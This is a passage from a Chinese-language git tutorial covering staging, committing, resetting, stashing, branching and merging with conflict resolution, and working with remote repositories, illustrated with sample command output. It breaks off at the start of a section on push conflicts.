<h3 id="4-2-将工作区保存到暂存区"><a href="#4-2-将工作区保存到暂存区" class="headerlink" title="4.2. 将工作区保存到暂存区"></a>4.2. 将工作区保存到暂存区</h3><p><code>git add xxx</code>  <code>add</code>命令并非添加一个文件。而是，将<strong>修改或新增的文件</strong>从工作区添加到当前本地仓库的暂存区中，表明此修改或新增的文件在下次commit提交的内容之中了。常用<code>git add</code>来添加新增的文件。</p>
<p><code>git add *</code> 将所有修改与新增的文件添加到暂存区。当你在仓库根目录下设置了<code>.gitignore</code>文件并配置了忽略文件时，此命令会报错，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add *</span><br><span class="line">The following paths are ignored by one of your .gitignore files:</span><br><span class="line">ignore.md</span><br><span class="line">Use -f <span class="keyword">if</span> you really want to add them.</span><br><span class="line">fatal: no files added</span><br></pre></td></tr></table></figure>

<p>如果你强行使用<code>git add -f *</code>命令，则会添加ignore.md文件。但这样<code>.gitignore</code>文件就没有意义了，所以不建议使用<code>git add *</code>和<code>git add -f *</code>。</p>
<h3 id="4-3-将暂存区提交到版本库"><a href="#4-3-将暂存区提交到版本库" class="headerlink" title="4.3. 将暂存区提交到版本库"></a>4.3. 将暂存区提交到版本库</h3><p><code>git commit</code> 将暂存区提交到本地仓库的版本库。若存在没有被<code>git add</code>添加到暂存区的文件，则不会被提交。</p>
<p><code>-m &quot;xxxx&quot;</code> 后面跟着的为本次提交的说明。<code>git commit</code>时必须使用此选项。</p>
<p><code>-a</code> 官方解释:”Tell the command to automatically stage files that have been modified and deleted, but new files you have not told Git about are not affected.” 意思大概是：<code>-a</code>将<strong>工作区</strong>中所有进行修改或删除后的文件都提交到本地仓库，但新增的文件并不提交。</p>
<p>常用<code>commit -m&quot;aaa&quot; -a</code>直接将更改从工作区提交到版本库，而不用经过暂存区。</p>
<h3 id="4-4-撤销-重置"><a href="#4-4-撤销-重置" class="headerlink" title="4.4. 撤销(重置)"></a>4.4. 撤销(重置)</h3><p><code>git reset --hard</code>  等价于  <code>git reset --hard HEAD</code>  即撤销工作区和暂存区中的所有修改，重置为版本库中HEAD指向的当前版本(未被修改的部分)。</p>
<p>而上一个版本就是 **<code>HEAD^</code>**，上上一个版本就是 **<code>HEAD^^</code>**，当然往上100个版本写100个^比较容易数不过来，所以写成 **<code>HEAD~100</code>**。</p>
<p>或者，你也可以 <code>git reset --hard &lt;commit_id&gt;</code> 直接回溯到某个版本，<code>&lt;commit_id&gt;</code> 指版本号(通过 git log 查看)，版本号没必要写全，前几位就可以了，Git会自动去找。</p>
<p><code>git reset &lt;file&gt;</code>或<code>git reset HEAD &lt;file&gt;</code> 撤销<code>git add</code>到暂存区的修改。</p>
<p><code>git checkout -- &lt;file&gt;</code> 撤销工作区的修改。</p>
<h3 id="4-5-删除"><a href="#4-5-删除" class="headerlink" title="4.5. 删除"></a>4.5. 删除</h3><p><code>git rm &lt;file&gt;</code> 如果你已经把某个新增文件提交到版本库了，然后你想删除这个文件，那就用该命令将文件删去，再提交。使用该命令后，git的状态是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">rm</span> test.md</span><br><span class="line"><span class="built_in">rm</span> <span class="string">&#x27;test.md&#x27;</span></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is up to <span class="built_in">date</span> with <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use <span class="string">&quot;git reset HEAD &lt;file&gt;...&quot;</span> to unstage)</span><br><span class="line"></span><br><span class="line">        deleted:    test.md</span><br></pre></td></tr></table></figure>

<p>说明 <code>git rm</code> 会直接更新到暂存区。</p>
<p>删除文件其实还可以，直接删除，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">README.md  ignore2.md  test2.md</span><br><span class="line">$ <span class="built_in">rm</span> test2.md</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">README.md  ignore2.md</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is up to <span class="built_in">date</span> with <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Changes not staged <span class="keyword">for</span> commit:</span><br><span class="line">  (use <span class="string">&quot;git add/rm &lt;file&gt;...&quot;</span> to update what will be committed)</span><br><span class="line">  (use <span class="string">&quot;git checkout -- &lt;file&gt;...&quot;</span> to discard changes <span class="keyword">in</span> working directory)</span><br><span class="line"></span><br><span class="line">        deleted:    test2.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use <span class="string">&quot;git add&quot;</span> and/or <span class="string">&quot;git commit -a&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>此时没有直接更新到暂存区，可以通过 <code>git add/rm &lt;file&gt;</code> 来更新。同时，可以通过 <code>git checkout -- &lt;file&gt;</code> 来恢复这个文件。</p>
<h3 id="4-6-查看状态"><a href="#4-6-查看状态" class="headerlink" title="4.6. 查看状态"></a>4.6. 查看状态</h3><p><code>git status</code> 显示工作区与暂存区的状态，比如哪些文件被修改了、哪些文件没保存到暂存区、哪些文件没提交等等。若存在没被add的<strong>新文件</strong>（即未被git跟踪的文件），则会提示<code>Untracked</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line"><span class="comment"># On branch master</span></span><br><span class="line"><span class="comment"># Changes to be committed:</span></span><br><span class="line"><span class="comment">#   (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   new file:   .gitignore</span></span><br><span class="line"><span class="comment">#   deleted:    ignore.md</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Changes not staged for commit:</span></span><br><span class="line"><span class="comment">#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span></span><br><span class="line"><span class="comment">#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   modified:   test.md</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Untracked files:</span></span><br><span class="line"><span class="comment">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   ignore2.md</span></span><br></pre></td></tr></table></figure>

<p><code>git status -s</code> 更简单地显示状态变化，如：显示 <code>M controllers/article.go</code><br>显示内容的每一行开头，M表示被修改、A表示被增加、？？表示未受控制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status -s</span><br><span class="line">A  .gitignore</span><br><span class="line">D  ignore.md</span><br><span class="line">M  test.md</span><br><span class="line">?? ignore2.md</span><br></pre></td></tr></table></figure>

<h3 id="4-7-查看不同"><a href="#4-7-查看不同" class="headerlink" title="4.7. 查看不同"></a>4.7. 查看不同</h3><p><code>git diff readme.txt</code> 查看readme.txt这个文件中具体什么内容被修改了。其中：</p>
<ul>
<li><code>git diff</code> 查看工作区和暂存区的区别</li>
<li><code>git diff --cached</code> 查看暂存区和版本库之间的区别</li>
<li><code>git diff HEAD</code> 查看工作区和版本库之间的区别</li>
</ul>
<h3 id="4-8-查看提交日志"><a href="#4-8-查看提交日志" class="headerlink" title="4.8. 查看提交日志"></a>4.8. 查看提交日志</h3><p><code>git log</code> 查看仓库版本库中(本地仓库和远程仓库的版本库是一样的)从最近到最远的版本信息。换而言之，即每次提交的信息。如下是一次的信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">commit ee26988de11d36133d180663ddf7b24c4a6233e5</span><br><span class="line">Author: douNine &lt;<span class="built_in">test</span>@dev3.airdb.io&gt;</span><br><span class="line">Date:   Fri Dec 21 00:47:21 2018 +0800</span><br><span class="line"></span><br><span class="line">    modify task/sync_bbs.go</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中commit一项对应的，是git提交的版本号</p>
<p><code>git log --graph</code> 显示版本以及分支图，可以说很生动形象了</p>
<p><code>git reflog</code> 查看历史git命令</p>
<h3 id="4-9-隐藏工作"><a href="#4-9-隐藏工作" class="headerlink" title="4.9. 隐藏工作"></a>4.9. 隐藏工作</h3><p>当工作区的修改未提交，而我们又想将其隐藏起来时，就需要用到git的<code>stash</code>功能。</p>
<p><code>git stash</code> 隐藏工作区和暂存区的修改，储存到一个地方。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of <span class="string">&#x27;origin/master&#x27;</span> by 4 commits.</span><br><span class="line">  (use <span class="string">&quot;git push&quot;</span> to publish your <span class="built_in">local</span> commits)</span><br><span class="line"></span><br><span class="line">Changes not staged <span class="keyword">for</span> commit:</span><br><span class="line">  (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to update what will be committed)</span><br><span class="line">  (use <span class="string">&quot;git checkout -- &lt;file&gt;...&quot;</span> to discard changes <span class="keyword">in</span> working directory)</span><br><span class="line"></span><br><span class="line">        modified:   test2.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use <span class="string">&quot;git add&quot;</span> and/or <span class="string">&quot;git commit -a&quot;</span>)</span><br><span class="line">$ git stash</span><br><span class="line">Saved working directory and index state WIP on master: f0f89d4 --no-ff merge</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of <span class="string">&#x27;origin/master&#x27;</span> by 4 commits.</span><br><span class="line">  (use <span class="string">&quot;git push&quot;</span> to publish your <span class="built_in">local</span> commits)</span><br><span class="line"></span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p><code>git stash list</code> 查看储存起来的工作现场。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git stash list</span><br><span class="line">stash@&#123;0&#125;: WIP on master: f0f89d4 --no-ff merge</span><br></pre></td></tr></table></figure>

<p>恢复工作现场有两种方法：</p>
<p>一是用<code>git stash apply</code>恢复，但是恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p>
<p>另一种方式是用<code>git stash pop</code>，恢复的同时把stash内容也删了。</p>
<h2 id="5-git分支"><a href="#5-git分支" class="headerlink" title="5. git分支"></a>5. git分支</h2><h3 id="5-1-分支的作用："><a href="#5-1-分支的作用：" class="headerlink" title="5.1. 分支的作用："></a>5.1. 分支的作用：</h3><blockquote>
<p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。<br>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p>
</blockquote>
<p>总而言之，就是你可以在另外的git分支上干自己的事，而不影响主分支。做完还可以更新到主分支上。</p>
<p>注：git中主分支只有一条，叫 **<code>master</code>**。一条分支就是一条时间线，每个时间节点代表着每个版本。<code>master</code>是主分支的名字，同时也是指向主分支最新节点的指针，而<code>HEAD</code>一开始指向的就是 <code>master</code> 指针。</p>
<h3 id="5-2-创建、切换分支"><a href="#5-2-创建、切换分支" class="headerlink" title="5.2. 创建、切换分支"></a>5.2. 创建、切换分支</h3><p><code>git branch dev</code> 创建dev分支。dev分支会继承<strong>当前分支</strong>的所有内容。</p>
<p><code>git checkout dev</code> 切换到dev分支上。</p>
<p><code>git checkout -b dev</code> 创建dev分支，然后切换到dev分支上。git checkout命令加上-b参数表示创建并切换分支，相当于以下两条命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch dev</span><br><span class="line">$ git checkout dev</span><br><span class="line">Switched to branch <span class="string">&#x27;dev&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-3-查看分支"><a href="#5-3-查看分支" class="headerlink" title="5.3. 查看分支"></a>5.3. 查看分支</h3><p><code>git branch</code> 查看分支，<code>*</code> 后面的是当前所处分支。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br></pre></td></tr></table></figure>

<p><code>git branch -a</code> 查看远程和本地所有的分支信息。</p>
<p><code>git log --graph --pretty=oneline --abbrev-commit</code> 该命令常用于生动形象地显示简略的分支图。显示如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> --graph --pretty=oneline --abbrev-commit</span><br><span class="line">*   07bb2d8 (HEAD -&gt; master, origin/master, origin/HEAD, dev) merge</span><br><span class="line">|\</span><br><span class="line">| * 5a0a7da commit <span class="keyword">in</span> dev</span><br><span class="line">* | 48a4216 commit <span class="keyword">in</span> master</span><br><span class="line">|/</span><br><span class="line">* 6aa880e a</span><br><span class="line">*   91147e8 解决分支冲突</span><br><span class="line">|\</span><br><span class="line">| * ea5cf82 commit <span class="keyword">in</span> dev</span><br><span class="line">* | 28809bb commit <span class="keyword">in</span> master</span><br><span class="line">|/</span><br><span class="line">* 82016a7 commit <span class="keyword">in</span> dev</span><br><span class="line">* 6bf1a5d git <span class="built_in">rm</span></span><br><span class="line">* 09f2106 bb</span><br><span class="line">* 4524372 aabb</span><br><span class="line">* 058e02c aaa</span><br><span class="line">* f5cc038 git add -f * can add all file including the ignore file</span><br><span class="line">* b5f8f30 aa</span><br><span class="line">* 92c65b1 <span class="built_in">test</span> add</span><br><span class="line">* d0fe8dc <span class="built_in">test</span></span><br><span class="line">* 3a870e8 <span class="literal">true</span> demo</span><br><span class="line">* 09d694b find why show falsely</span><br><span class="line">* d6b46e1 also <span class="built_in">test</span></span><br><span class="line">* a757718 test.md</span><br><span class="line">* 69483da Update README.md</span><br><span class="line">* cfb9ede Update README.md</span><br><span class="line">*   9bdf268 Merge pull request <span class="comment">#1 from 99MyCql/readme-edits</span></span><br><span class="line">|\</span><br><span class="line">| * 3cef569 Update README.md</span><br><span class="line">|/</span><br><span class="line">* 677f493 Initial commit</span><br></pre></td></tr></table></figure>

<h3 id="5-4-合并分支"><a href="#5-4-合并分支" class="headerlink" title="5.4. 合并分支"></a>5.4. 合并分支</h3><p>在dev分支上添加一些内容，然后提交到该分支上，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add branch.md</span><br><span class="line">$ git commit -m<span class="string">&quot;commit in dev&quot;</span></span><br><span class="line">[dev 82016a7] commit <span class="keyword">in</span> dev</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 branch.md</span><br><span class="line">$ git status</span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>回到主分支上，意料之中，并没有出现刚刚修改的内容(新增了branch.md文件)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout dev</span><br><span class="line">Switched to branch <span class="string">&#x27;dev&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">README.md  branch.md  ignore2.md  test2.md</span><br><span class="line">$ git checkout master</span><br><span class="line">Switched to branch <span class="string">&#x27;master&#x27;</span></span><br><span class="line">Your branch is up to <span class="built_in">date</span> with <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">README.md  ignore2.md  test2.md</span><br></pre></td></tr></table></figure>

<p>此时，需要将dev分支上合并到master分支上，就能将修改从dev分支更新到master分支上了。</p>
<p><code>git merge dev</code> 将dev分支合并到master分支。结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git merge dev</span><br><span class="line">Updating 6bf1a5d..82016a7</span><br><span class="line">Fast-forward</span><br><span class="line"> branch.md | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 branch.md</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">README.md  branch.md  ignore2.md  test2.md</span><br></pre></td></tr></table></figure>

<h3 id="5-5-合并分支-分支管理篇"><a href="#5-5-合并分支-分支管理篇" class="headerlink" title="5.5. 合并分支(分支管理篇)"></a>5.5. 合并分支(分支管理篇)</h3><p>使用 <code>git merge dev</code> 将dev分支合并到master分支时，会将dev中的提交都变为master中的提交。即将两个分支融合在一起，dev中的提交将不在显示。这种合并方式称为：<code>Fast-forward</code>。</p>
<p>但在实际使用中，我们希望保留dev的提交信息，这样能清晰地了解项目每一步的进行。</p>
<p><code>$ git merge --no-ff -m &quot;xxx&quot; dev</code> 该命令的作用是不采用<code>Fast-forward</code>模式，保留dev分支中每次提交的信息。合并到master分支时，建立一个新的提交，即将dev中的新内容提交到master，而不是粗暴地融合。因此，该命令相当于一个提交，需要附加提交信息<code>-m &quot;xxx&quot;</code>。<strong>该命令是项目中的合并常用命令</strong>。</p>
<p><code>--no-ff</code> 与 <code>Fast forward</code> 区别：</p>
<p>未合并时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  A---B---C dev</span><br><span class="line"> /</span><br><span class="line">D------------ master</span><br></pre></td></tr></table></figure>

<p><code>git merge dev</code> 合并：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D-A---B---C master</span><br></pre></td></tr></table></figure>

<p><code>git merge --no-ff -m &quot;xxx&quot; dev</code> 合并：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  A---B---C dev</span><br><span class="line"> /         \</span><br><span class="line">D-----------E master</span><br></pre></td></tr></table></figure>

<h3 id="5-6-删除分支"><a href="#5-6-删除分支" class="headerlink" title="5.6. 删除分支"></a>5.6. 删除分支</h3><p><code>git branch -d dev</code> 删除dev分支</p>
<p>如果分支未合并，则需要强制删除 <code>git branch -D dev</code></p>
<h3 id="5-7-解决分支合并冲突"><a href="#5-7-解决分支合并冲突" class="headerlink" title="5.7. 解决分支合并冲突"></a>5.7. 解决分支合并冲突</h3><p>在dev分支上修改branch.md文件并提交。然后，切换到master分支上修改branch.md文件同样位置，但修改内容不同，接着在master上也进行提交。</p>
<p>此时，在master分支上合并dev分支。显然，两个分支上都对同一文件同一位置做了不同修改，这样的合并必然会产生冲突的。合并结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git merge dev</span><br><span class="line">Auto-merging branch.md</span><br><span class="line">CONFLICT (content): Merge conflict <span class="keyword">in</span> branch.md</span><br><span class="line">Automatic merge failed; fix conflicts and <span class="keyword">then</span> commit the result.</span><br></pre></td></tr></table></figure>

<p>查看branch.md文件，文件中内容如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">in master branch:</span><br><span class="line"><span class="section">change in master</span></span><br><span class="line"><span class="section">=======</span></span><br><span class="line">in dev branch:</span><br><span class="line">add this change</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; dev</span><br></pre></td></tr></table></figure>

<p><code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</code> 与 <code>=======</code> 之间的是master分支中的内容。</p>
<p><code>=======</code> 与 <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt; dev</code> 之间是dev分支中的内容。</p>
<p>对于两部分冲突内容，我们需要 <strong>手动解决冲突</strong> 。选择需要的留下，而将剩下的删除即可。此处，我们选择master中的内容。解决后文件内容如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">in master branch:</span><br><span class="line">change in master</span><br></pre></td></tr></table></figure>

<p>此时再查看git状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of <span class="string">&#x27;origin/master&#x27;</span> by 2 commits.</span><br><span class="line">  (use <span class="string">&quot;git push&quot;</span> to publish your <span class="built_in">local</span> commits)</span><br><span class="line"></span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run <span class="string">&quot;git commit&quot;</span>)</span><br><span class="line">  (use <span class="string">&quot;git merge --abort&quot;</span> to abort the merge)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to mark resolution)</span><br><span class="line"></span><br><span class="line">        both modified:   branch.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use <span class="string">&quot;git add&quot;</span> and/or <span class="string">&quot;git commit -a&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>按照git的建议，再 <code>git commit -a</code> 提交即可。</p>
<p><strong>注</strong>：</p>
<p>1）虽然在master分支中合并了冲突，但是，在dev分支中的内容并没有被修改。不过，合并之后，dev分支已经不重要了。</p>
<p>2）在冲突未解决时，很多git操作都不能使用，比如：撤销。</p>
<h3 id="5-8-分支管理策略"><a href="#5-8-分支管理策略" class="headerlink" title="5.8. 分支管理策略"></a>5.8. 分支管理策略</h3><blockquote>
<p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
</blockquote>
<blockquote>
<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
</blockquote>
<blockquote>
<p>那在哪干活呢？dev分支。也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
</blockquote>
<blockquote>
<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
</blockquote>
<blockquote>
<p>软件开发中，bug就像家常便饭一样。有了bug就需要修复，在Git中，由于分支是如此的强大，所以，每个bug都可以通过一个新的临时分支来修复，修复后，合并分支，然后将临时分支删除。</p>
</blockquote>
<p>而合并时，注意要采用<code>--no-ff</code>模式。</p>
<h2 id="6-git远程仓库"><a href="#6-git远程仓库" class="headerlink" title="6. git远程仓库"></a>6. git远程仓库</h2><h3 id="6-1-克隆到本地"><a href="#6-1-克隆到本地" class="headerlink" title="6.1. 克隆到本地"></a>6.1. 克隆到本地</h3><p><code>git clone https://github.com/xxx/xxx</code> 将github上xxx远程仓库的代码克隆到本地，形成本地仓库。</p>
<p>假如，远程有两个分支master和dev，本地只有一个master分支，克隆或者拉取后并不会在本地创建dev分支。</p>
<p>我们需要用<code>git checkout -b dev origin/dev</code>命令，将远程dev分支创建到本地。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/99MyCql/TestOfGit.git</span><br><span class="line">Cloning into <span class="string">&#x27;TestOfGit&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 53, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (53/53), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (28/28), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 84 (delta 20), reused 50 (delta 17), pack-reused 31</span><br><span class="line">Unpacking objects: 100% (84/84), <span class="keyword">done</span>.</span><br><span class="line">$ <span class="built_in">cd</span> TestOfGit/</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">branch.md  ignore2.md  README.md  test2.md</span><br><span class="line">$ git branch -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/dev</span><br><span class="line">  remotes/origin/master</span><br><span class="line">$ git checkout -b dev origin/dev</span><br><span class="line">Branch dev <span class="built_in">set</span> up to track remote branch dev from origin.</span><br><span class="line">Switched to a new branch <span class="string">&#x27;dev&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-2-查看远程仓库信息"><a href="#6-2-查看远程仓库信息" class="headerlink" title="6.2. 查看远程仓库信息"></a>6.2. 查看远程仓库信息</h3><p><code>git remote</code> 查看远程仓库信息。</p>
<p><code>git remote -v</code> 查看详细信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote</span><br><span class="line">origin</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  https://github.com/99MyCql/TestOfGit.git (fetch)</span><br><span class="line">origin  https://github.com/99MyCql/TestOfGit.git (push)</span><br></pre></td></tr></table></figure>

<p><code>-v</code> 显示了抓取和推送的地址，如果不可推送则没有第二个地址。</p>
<p><code>git branch -a</code> 查看远程和本地所有的分支信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch -a</span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/dev</span><br><span class="line">  remotes/origin/master</span><br></pre></td></tr></table></figure>

<h3 id="6-3-添加远程仓库"><a href="#6-3-添加远程仓库" class="headerlink" title="6.3. 添加远程仓库"></a>6.3. 添加远程仓库</h3><p><code>git remote add &lt;name&gt; &lt;url&gt;</code>，添加一个远程仓库，<code>shortname</code>为自定义的远程主机名，<code>url</code>为远程仓库的<code>url</code></p>
<h3 id="6-4-删除远程仓库"><a href="#6-4-删除远程仓库" class="headerlink" title="6.4. 删除远程仓库"></a>6.4. 删除远程仓库</h3><p><code>git remote remove &lt;name&gt;</code></p>
<h3 id="6-5-本地与远程分支追踪关系"><a href="#6-5-本地与远程分支追踪关系" class="headerlink" title="6.5. 本地与远程分支追踪关系"></a>6.5. 本地与远程分支追踪关系</h3><p>在某些场合，Git会自动在本地分支与远程分支之间，建立一种<strong>追踪关系</strong>（tracking）。比如，在git clone的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的master分支自动”追踪”origin&#x2F;master分支。Git也允许手动建立追踪关系。</p>
<p><code>$ git branch --set-upstream-to origin/dev dev</code> 该命令指定dev分支追踪origin&#x2F;dev分支，即将本地dev分支与远程dev分支建立追踪关系。</p>
<p>当没有建立追踪关系时，如果在dev分支进行远程操作又没有指定远程分支时，则会出错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line">$ git push</span><br><span class="line">fatal: The current branch dev has no upstream branch.</span><br><span class="line">To push the current branch and <span class="built_in">set</span> the remote as upstream, use</span><br><span class="line"></span><br><span class="line">    git push --set-upstream origin dev</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此，得先建立本地分支与远程分支的追踪关系：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch --set-upstream-to origin/dev dev</span><br><span class="line">Branch <span class="string">&#x27;dev&#x27;</span> <span class="built_in">set</span> up to track remote branch <span class="string">&#x27;dev&#x27;</span> from <span class="string">&#x27;origin&#x27;</span>.</span><br><span class="line">$ git push</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">&#x27;https://github.com&#x27;</span>: 99MyCql</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">&#x27;https://99MyCql@github.com&#x27;</span>:</span><br></pre></td></tr></table></figure>

<h3 id="6-6-拉取"><a href="#6-6-拉取" class="headerlink" title="6.6. 拉取"></a>6.6. 拉取</h3><p><code>$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code> 取回远程主机某个分支的更新，再与本地的指定分支合并。</p>
<p>如：<br><code>$ git pull origin next:master</code> 取回origin主机的next分支，与本地的master分支合并</p>
<p><code>$ git pull origin next</code> 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。</p>
<p><code>$ git pull origin</code> 本地的当前分支自动与对应的origin主机”追踪分支”进行合并。</p>
<p><code>$ git pull</code> 该命令表示，当前分支自动与<strong>唯一追踪分支</strong>进行合并。</p>
<p>如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支。</p>
<p>但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。<code>$ git pull -p</code></p>
<h3 id="6-7-推送"><a href="#6-7-推送" class="headerlink" title="6.7. 推送"></a>6.7. 推送</h3><p><code>$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</code> 注意，分支推送顺序的写法是&lt;来源地&gt;:&lt;目的地&gt;，所以git pull是&lt;远程分支&gt;:&lt;本地分支&gt;，而git push是&lt;本地分支&gt;:&lt;远程分支&gt;。</p>
<p><code>$ git push origin master</code> 该命令表示，将本地的master分支推送到origin主机的master分支。如果后者不存在，则会被新建。</p>
<p><code>$ git push origin :master</code> 如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。<br>等同于:<br><code>$ git push origin --delete master</code> 删除origin主机的master分支。</p>
<p><code>$ git push origin</code> 将当前分支推送到origin主机的对应存在追踪关系的分支。</p>
<p>如果当前分支只有一个追踪分支，那么主机名都可以省略<br><code>$ git push</code></p>
<h3 id="6-6-解决冲突"><a href="#6-6-解决冲突" class="headerlink" title="6.6. 解决冲突"></a>6.6. 解决冲突</h3><p>当多人协作时，经常会出现冲突。<br>比如，A和B同时拉取了远程最新版到本地。A修改了项目的origin.md文件，同时提交并推送到了远程。B也修改了该文件，但当B要推送时，便出现冲突报错了：</p>
